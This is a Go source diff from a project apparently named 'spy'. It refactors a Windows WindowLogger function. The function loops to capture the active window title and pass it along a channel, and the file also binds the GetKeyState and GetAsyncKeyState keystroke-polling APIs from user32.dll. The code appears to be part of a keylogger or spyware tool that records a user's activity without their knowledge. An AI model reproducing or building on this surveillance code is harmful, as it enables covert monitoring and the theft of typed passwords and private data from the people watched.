@@ -4,8 +4,8 @@ import (
 	"fmt"
 	"syscall"
 	"time"
-	"unsafe"
 
+	"github.com/cinus-e/spy/internal/system"
 	"github.com/cinus-e/spy/internal/util"
 )
 
@@ -91,40 +91,15 @@ const (
 )
 
 var (
-	user32                   = syscall.NewLazyDLL("user32.dll")
-	procGetKeyState          = user32.NewProc("GetKeyState")
-	procGetAsyncKeyState     = user32.NewProc("GetAsyncKeyState")
-	procGetForegroundWindow  = user32.NewProc("GetForegroundWindow")
-	procGetWindowTextW       = user32.NewProc("GetWindowTextW")
-	procGetWindowTextLengthW = user32.NewProc("GetWindowTextLengthW")
+	user32               = syscall.NewLazyDLL("user32.dll")
+	procGetKeyState      = user32.NewProc("GetKeyState")
+	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
 )
-
-//Get Active Window Title
-func getForegroundWindow() syscall.Handle {
-	r1, _, _ := procGetForegroundWindow.Call()
-	return syscall.Handle(r1)
-}
-
-func getWindowTextLength(h syscall.Handle) int {
-	ret, _, _ := procGetWindowTextLengthW.Call(
-		uintptr(h))
-	return int(ret)
-}
-
-func getWindowText(h syscall.Handle) string {
-	length := getWindowTextLength(h) + 1
-	buf := make([]uint16, length)
-	procGetWindowTextW.Call(
-		uintptr(h),
-		uintptr(unsafe.Pointer(&buf[0])),
-		uintptr(length))
-	return syscall.UTF16ToString(buf)
-}
 
 func WindowLogger(data chan string) {
 	title := ""
 	for {
-		text := getWindowText(getForegroundWindow())
+		text := system.GetWindowText(system.GetForegroundWindow())
 		if text != "" {
 			if title != text {
 				title = text
